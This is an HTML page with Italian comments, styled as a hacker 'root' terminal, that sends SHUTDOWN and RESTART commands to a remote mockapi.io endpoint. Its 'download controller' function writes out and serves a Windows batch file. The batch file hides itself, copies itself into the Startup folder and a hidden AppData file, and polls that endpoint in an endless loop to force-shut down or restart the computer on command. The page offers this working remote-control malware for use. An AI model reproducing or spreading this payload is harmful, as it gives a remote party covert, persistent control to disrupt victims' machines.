<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM_CTRL://ROOT</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        
        :root {
            --green: #00ff00;
            --red: #ff003c;
            --blue: #00aaff;
            --bg: #0a0a0a;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Share Tech Mono', monospace;
        }
        
        body {
            background-color: var(--bg);
            color: var(--green);
            line-height: 1.2;
            padding: 16px;
            overflow-x: hidden;
            position: relative;
        }
        
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03),
                rgba(0, 255, 0, 0.03) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 1000;
        }
        
        .scan-line {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(to bottom, rgba(0, 255, 0, 0.5), transparent);
            animation: scan 4s linear infinite;
            pointer-events: none;
            z-index: 1001;
        }
        
        @keyframes scan {
            0% { top: 0%; }
            100% { top: 100%; }
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            border: 1px solid var(--green);
            padding: 20px;
            position: relative;
            background: rgba(10, 10, 10, 0.95);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--green);
            position: relative;
        }
        
        h1 {
            font-size: 1.8rem;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 5px;
            text-shadow: 0 0 5px var(--green);
        }
        
        .header::after {
            content: "_";
            animation: blink 1s step-end infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .ip {
            font-size: 0.8rem;
            color: rgba(0, 255, 0, 0.7);
            margin-top: 10px;
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            font-size: 0.8rem;
        }
        
        .status-item {
            display: flex;
            align-items: center;
        }
        
        .status-led {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
            background-color: var(--green);
            box-shadow: 0 0 5px var(--green);
        }
        
        .commands {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 30px;
        }
        
        .btn {
            background: transparent;
            color: var(--green);
            border: 1px solid var(--green);
            padding: 12px;
            font-size: 0.9rem;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
            outline: none;
        }
        
        .btn::before {
            content: ">";
            margin-right: 5px;
        }
        
        .btn:hover {
            background: rgba(0, 255, 0, 0.1);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        
        .btn-shutdown {
            color: var(--red);
            border-color: var(--red);
        }
        
        .btn-shutdown:hover {
            background: rgba(255, 0, 60, 0.1);
            box-shadow: 0 0 10px rgba(255, 0, 60, 0.3);
        }
        
        .btn-download {
            grid-column: span 2;
            color: var(--blue);
            border-color: var(--blue);
        }
        
        .btn-download:hover {
            background: rgba(0, 170, 255, 0.1);
            box-shadow: 0 0 10px rgba(0, 170, 255, 0.3);
        }
        
        .console {
            border: 1px solid var(--green);
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.5);
        }
        
        .console-line {
            margin-bottom: 8px;
            animation: type 0.1s;
            white-space: nowrap;
            overflow: hidden;
        }
        
        .console-line::before {
            content: "> ";
            color: var(--blue);
        }
        
        .console-cursor {
            display: inline-block;
            background-color: var(--green);
            width: 8px;
            height: 1.2em;
            animation: blink 1s infinite;
            vertical-align: middle;
            margin-left: 2px;
        }
        
        .footer {
            font-size: 0.7rem;
            text-align: center;
            color: rgba(0, 255, 0, 0.5);
            margin-top: 20px;
            border-top: 1px solid var(--green);
            padding-top: 15px;
        }
        
        ::selection {
            background: var(--green);
            color: black;
        }
        
        ::-webkit-scrollbar {
            width: 5px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 255, 0, 0.1);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--green);
        }
        
        @media (max-width: 600px) {
            .commands {
                grid-template-columns: 1fr;
            }
            
            .btn-download {
                grid-column: span 1;
            }
            
            h1 {
                font-size: 1.4rem;
            }
        }
    </style>
</head>
<body>
    <div class="scan-line"></div>
    
    <div class="container">
        <div class="header">
            <h1>SYSTEM_CTRL://ROOT</h1>
            <div class="ip">[IP: 192.168.1.66] [ACCESS: ROOT] [MODE: STEALTH]</div>
        </div>
        
        <div class="status-bar">
            <div class="status-item">
                <div class="status-led"></div>
                <span>CONNECTION: ACTIVE</span>
            </div>
            <div class="status-item">
                <div class="status-led"></div>
                <span>LATENCY: &lt;1ms</span>
            </div>
            <div class="status-item">
                <div class="status-led"></div>
                <span>MODE: READY</span>
            </div>
        </div>
        
        <div class="commands">
            <button class="btn" onclick="sendCommand('SHUTDOWN')">SHUTDOWN</button>
            <button class="btn btn-shutdown" onclick="sendCommand('RESTART')">RESTART</button>
            <button class="btn btn-download" onclick="downloadBatFile()">DOWNLOAD CONTROLLER</button>
        </div>
        
        <div class="console" id="console">
            <div class="console-line">SYSTEM BOOT INITIATED<span class="console-cursor"></span></div>
            <div class="console-line">CONNECTING TO SERVER... OK<span class="console-cursor"></span></div>
            <div class="console-line">STEALTH MODE ACTIVATED<span class="console-cursor"></span></div>
            <div class="console-line">READY FOR COMMANDS<span class="console-cursor"></span></div>
        </div>
        
        <div class="footer">
            [UNKNOWN//USER] @ TERMINAL #4 | ACCESS LEVEL: MAXIMUM | 23:59:45
        </div>
    </div>

    <script>
        const endpoint = "https://68b36d2fc28940c9e69eddeb.mockapi.io/shutdown_commands";
        let consoleElement = document.getElementById('console');
        
        // Aggiungi righe alla console
        function addConsoleLine(text) {
            const line = document.createElement('div');
            line.className = 'console-line';
            line.innerHTML = text + '<span class="console-cursor"></span>';
            consoleElement.appendChild(line);
            consoleElement.scrollTop = consoleElement.scrollHeight;
            
            // Mantieni massimo 20 righe
            if (consoleElement.children.length > 20) {
                consoleElement.removeChild(consoleElement.firstChild);
            }
        }
        
        // Simula digitazione
        function simulateTyping(text, delay = 100) {
            return new Promise(resolve => {
                setTimeout(() => {
                    addConsoleLine(text);
                    resolve();
                }, delay);
            });
        }
        
        function sendCommand(command) {
            // Disabilita i pulsanti durante l'invio
            document.querySelectorAll('.btn').forEach(btn => {
                btn.disabled = true;
            });
            
            simulateTyping("EXECUTING " + command + " COMMAND...")
                .then(() => simulateTyping("CONNECTING TO SERVER..."))
                .then(() => {
                    fetch(endpoint, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            command: command,
                            timestamp: new Date().toISOString()
                        })
                    })
                    .then(response => {
                        if (response.ok) {
                            simulateTyping("COMMAND EXECUTED SUCCESSFULLY");
                            simulateTyping("AWAITING CONFIRMATION...");
                            
                            // Elimina il comando dopo 15 secondi
                            setTimeout(deleteLastCommand, 15000);
                        } else {
                            throw new Error('SERVER ERROR');
                        }
                    })
                    .catch(error => {
                        simulateTyping("ERROR: CONNECTION FAILED");
                        simulateTyping("RETRYING...");
                    })
                    .finally(() => {
                        // Riabilita i pulsanti
                        setTimeout(() => {
                            document.querySelectorAll('.btn').forEach(btn => {
                                btn.disabled = false;
                            });
                        }, 2000);
                    });
                });
        }
        
        function deleteLastCommand() {
            fetch(endpoint)
            .then(response => response.json())
            .then(commands => {
                if (commands.length > 0) {
                    const lastCommandId = commands[commands.length - 1].id;
                    
                    fetch(`${endpoint}/${lastCommandId}`, {
                        method: 'DELETE'
                    })
                    .then(response => {
                        if (response.ok) {
                            simulateTyping("COMMAND ERASED FROM SERVER");
                        }
                    });
                }
            });
        }
        
        function downloadBatFile() {
            simulateTyping("PREPARING CONTROLLER FOR DOWNLOAD...");
            
            // BAT file ultra minimal
            const batContent = `@echo off\r
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit\r
\r
copy "%~f0" "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_ctrl.bat" >nul 2>&1\r
copy "%~f0" "%AppData%\\system_ctrl.bat" >nul 2>&1\r
attrib +h "%AppData%\\system_ctrl.bat" >nul 2>&1\r
\r
set "endpoint=https://68b36d2fc28940c9e69eddeb.mockapi.io/shutdown_commands"\r
\r
:loop\r
powershell -noprofile -command "\r
try {\r
    $response = Invoke-RestMethod -Uri '%endpoint%' -Method GET -TimeoutSec 1;\r
    if ($response.command -eq 'SHUTDOWN') { Stop-Computer -Force };\r
    if ($response.command -eq 'RESTART') { Restart-Computer -Force };\r
} catch {}\r
"\r
\r
timeout /t 0 >nul\r
goto loop`;
            
            const blob = new Blob([batContent], { type: 'application/bat' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'system_ctrl.bat';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            simulateTyping("CONTROLLER DOWNLOAD COMPLETE");
            simulateTyping("READY FOR DEPLOYMENT");
        }
        
        // Inizializza effetti terminale
        setTimeout(() => {
            simulateTyping("SYSTEM READY");
        }, 1000);
    </script>
</body>
</html>
